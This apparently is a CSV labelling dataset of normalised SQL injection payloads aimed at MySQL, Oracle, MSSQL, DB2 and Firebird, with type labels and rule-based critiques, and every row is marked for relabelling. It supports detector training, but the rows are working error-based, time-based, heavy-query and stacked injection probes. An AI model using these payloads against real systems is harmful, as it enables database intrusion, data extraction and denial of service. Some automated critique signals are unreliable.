id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
18303,if ( 3831 = 9321 ) select 3831 else drop function ybru--,stacked_queries,mysql,0.9,IF DROP for stacked queries,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,if ( 3831 = 9321 ) select 3831 else drop function ybru--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18304,if ( 3490 = 4920 ) select 3490 else drop function hlzt--,stacked_queries,mysql,0.9,IF DROP for stacked queries,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,if ( 3490 = 4920 ) select 3490 else drop function hlzt--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18305,"1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,oracle,0.85,Multiple all_users table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18306,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",heavy_query,db2,0.85,Multiple systables join for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
18307,-2573 ) ) order by 1#,unknown,generic,0.7,ORDER BY without full query,RELABEL,type='unknown' needs verification,unknown,generic,-2573 ) ) order by 1#,False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
18308,"1"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""dtfg"" = ""dtfg",error_based,mysql,0.85,CONCAT with floor/rand for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""dtfg"" = ""dtfg",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18309,"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'ioar' = 'ioar",time_blind,generic,0.85,elt() with sleep for time blind,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'ioar' = 'ioar",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
18310,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb",heavy_query,oracle,0.85,Multiple all_users table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18311,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ulep' = 'ulep",error_based,mysql,0.85,exp() with concat for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ulep' = 'ulep",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18312,"1"" ) as buky where 7898 = 7898 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,Multiple all_users table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" ) as buky where 7898 = 7898 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18313,"1' ) ) as xntz where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",error_based,generic,0.85,Row/concat for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) as xntz where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18314,1 ) where 7680 = 7680 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,error_based,oracle,0.9,sqlid_to_sqlhash for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,1 ) where 7680 = 7680 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
18315,1'|| ( select 'fwph' where 3791 = 3791,unknown,oracle,0.7,SELECT without clear type,RELABEL,type='unknown' needs verification; rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,1'|| ( select 'fwph' where 3791 = 3791,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18316,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'xtdj' = 'xtdj",error_based,mysql,0.85,CONCAT for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'xtdj' = 'xtdj",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18317,1'|| ( select 'tvcy' where 5592 = 5592 order by 1#,unknown,oracle,0.7,SELECT ORDER BY without full context,RELABEL,type='unknown' needs verification; rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,1'|| ( select 'tvcy' where 5592 = 5592 order by 1#,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18318,"1%' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( '%' = '",heavy_query,mssql,0.85,Multiple sysusers table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( '%' = '",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18319,"1 ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 9558 = 9558",time_blind,generic,0.85,elt() with sleep for time blind,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1 ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 9558 = 9558",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
18320,"1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""jzsb"" = ""jzsb",heavy_query,mysql,0.85,Multiple domain table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""jzsb"" = ""jzsb",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18321,"-7416"" where 7656 = 7656 order by 1--",unknown,generic,0.7,ORDER BY without full query,RELABEL,type='unknown' needs verification,unknown,generic,"-7416"" where 7656 = 7656 order by 1--",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
18322,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",heavy_query,oracle,0.85,Multiple all_users table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18323,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'cjre' = 'cjre",time_blind,generic,0.85,elt() with sleep for time blind,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'cjre' = 'cjre",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
18324,"1%' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,mysql,0.85,Multiple domain table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18325,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'eugs' = 'eugs",error_based,mysql,0.9,updatexml() for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'eugs' = 'eugs",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18326,"1"" where 2365 = 2365 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.85,Multiple systables join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1"" where 2365 = 2365 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
18327,( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7812 = 7812 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) from dual ),error_based,oracle,0.9,chr() with case for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7812 = 7812 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) from dual ),False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
18328,"1'|| ( select 'bpml' where 7360 = 7360 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) ||'",error_based,mysql,0.9,extractvalue() for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1'|| ( select 'bpml' where 7360 = 7360 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) ||'",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18329,"1 ) where 9338 = 9338 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.9,extractvalue() for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1 ) where 9338 = 9338 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18330,"1'|| ( select 'hvqw' from dual where 4423 = 4423 union all select null,null,null--",unknown,oracle,0.7,SELECT without full context,RELABEL,type='unknown' needs verification; rule-check disagrees: rule says 'union_based' (P7) but labeled 'unknown' (P99),union_based,oracle,"1'|| ( select 'hvqw' from dual where 4423 = 4423 union all select null,null,null--",False,0,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
18331,end and ( ( 'eqoc' like 'eqoc,unknown,generic,0.6,END keyword without context,RELABEL,type='unknown' needs verification; confidence too low (0.60); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,end and ( ( 'eqoc' like 'eqoc,False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
18332,1' ) as lewd where 3118 = 3118 order by 1--,unknown,generic,0.7,ORDER BY without full query,RELABEL,type='unknown' needs verification,unknown,generic,1' ) as lewd where 3118 = 3118 order by 1--,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
18333,"1%' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and '%' = '",error_based,generic,0.85,Row/concat for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1%' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and '%' = '",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18334,"1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.85,Multiple systables join for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,oracle,"1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
18335,"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) # fzni",error_based,mysql,0.9,updatexml() for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) # fzni",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18336,1'|| ( select 'omeg' from dual where 4751 = 4751,unknown,oracle,0.7,SELECT without full context,RELABEL,type='unknown' needs verification; rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,oracle,1'|| ( select 'omeg' from dual where 4751 = 4751,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
18337,"1',extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",error_based,mysql,0.9,extractvalue() for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1',extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18338,"1' ) as eymt where 3911 = 3911 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.85,Multiple sysusers table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) as eymt where 3911 = 3911 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
18339,"1%"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""%"" = """,heavy_query,db2,0.85,Multiple systables join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1%"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""%"" = """,False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
18340,"1 ) as attr where 8085 = 8085 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.85,Multiple table join for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1 ) as attr where 8085 = 8085 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
18341,1'|| ( select 'gved' from dual where 6965 = 6965,unknown,oracle,0.7,SELECT without full context,RELABEL,type='unknown' needs verification; rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,oracle,1'|| ( select 'gved' from dual where 6965 = 6965,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
18342,"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'scye' like 'scye",error_based,mysql,0.85,CONCAT for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'scye' like 'scye",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
18343,"1"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""igop"" = ""igop",error_based,mysql,0.9,updatexml() for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""igop"" = ""igop",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
